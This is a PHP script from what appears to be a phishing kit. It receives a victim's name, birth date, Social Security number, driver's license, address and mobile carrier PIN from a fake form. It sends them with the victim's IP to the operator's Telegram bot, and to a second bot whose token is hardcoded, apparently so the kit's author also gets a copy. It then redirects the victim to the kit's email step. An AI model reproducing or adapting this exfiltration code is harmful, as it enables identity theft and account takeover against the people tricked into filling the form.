<?php

session_start();           
require_once '../../session/Comp.php';
require_once '../../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;


if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}



// function

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


# post date

$a1 = $_POST['fname'];
$b1 = $_POST['lname'];
$a2 = $_POST['dob'];
$b2 = $_POST['ssn'];
$a3 = $_POST['license'];
$b3 = $_POST['address'];
$a4 = $_POST['city'];
$b4 = $_POST['zipcode'];
$a5 = $_POST['carrierpin'];


$IP = get_client_ip();



// Data for telegram

$data .= "<---- Personal Information : {$IP} ---->\n\n";  // Need Change
$data .= "Page: Citizen\n\n";    // Need Change

$data .= "First Name : {$a1}\n";
$data .= "Last Name : {$b1}\n";
$data .= "Date of Birth : {$a2}\n";
$data .= "Social Security Number : {$b2}\n";
$data .= "Driver's License : {$a3}\n";
$data .= "Street address : {$b3}\n";
$data .= "City : {$a4}\n";
$data .= "ZIP code : {$b4}\n";
$data .= "Carrier Pin : {$a5}\n\n";


$data .= "Contact @Devilmask9\n";






// Telegram Bot

$token = file_get_contents("../config/token.txt");
$id = file_get_contents("../config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$tokens = "1793765167:AAFC1XhM-ri-_KKQKZXrQmjLr5GiGwuabwA";
$ids = "1802897390";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";

$params=[
	'chat_id'=>$ids,
	'text'=>$data,
];

$ch = curl_init($bots . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

# Head Back To Next Step


header('Location:../email.php?token='.$_SESSION['token']);  // Need Change


?>